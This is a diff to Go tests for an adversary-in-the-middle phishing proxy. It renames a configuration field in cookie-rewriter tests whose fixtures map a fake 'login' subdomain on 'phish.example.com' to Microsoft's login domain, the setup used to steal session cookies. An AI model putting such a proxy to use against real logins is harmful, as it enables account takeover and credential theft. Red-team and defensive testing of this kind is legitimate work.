@@ -76,7 +76,7 @@ func TestCookieRewriter_RewritesDomain(t *testing.T) {
 				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
 			},
 		},
-		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
+		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
@@ -338,7 +338,7 @@ func TestCookieRewriter_RewritesDomainAndForcesSecure(t *testing.T) {
 				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
 			},
 		},
-		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
+		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
@@ -360,7 +360,7 @@ func TestCookieRewriter_NoDomain_PassesThrough(t *testing.T) {
 
 	ctx := &aitm.ProxyContext{
 		Phishlet:    &aitm.PhishletDef{},
-		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
+		Deployment: &aitm.PhishletDeployment{BaseDomain: "phish.example.com"},
 	}
 
 	if err := h.Handle(ctx, resp); err != nil {
